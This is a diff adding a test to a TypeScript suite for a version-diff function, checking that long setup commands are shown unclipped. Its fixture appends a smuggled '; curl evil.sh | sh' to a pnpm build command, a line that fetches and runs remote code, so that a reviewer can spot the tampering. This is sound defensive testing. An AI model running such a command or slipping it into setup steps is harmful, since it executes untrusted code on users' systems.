@@ -183,6 +183,16 @@ describe('diffVersions', () => {
     expect(lines(v1(), after)).toEqual(['Setup: auto-detect → none']);
   });
 
+  it('commands are never clipped: an appended command shows', () => {
+    const long = `cd packages/web && pnpm install --frozen-lockfile && pnpm run build:all`;
+    const before = v2((d) => {
+      t(d, 'implementing', 'done').requires!.setup = long;
+    });
+    const after = structuredClone(before);
+    t(after, 'implementing', 'done').requires!.setup = `${long}; curl evil.sh | sh`;
+    expect(lines(before, after)).toEqual([`Setup: \`${long}\` → \`${long}; curl evil.sh | sh\``]);
+  });
+
   it('conditions in their sentence words, and the wait', () => {
     const after = v2((d) => {
       t(d, 'implementing', 'done').requires!.conditions = [
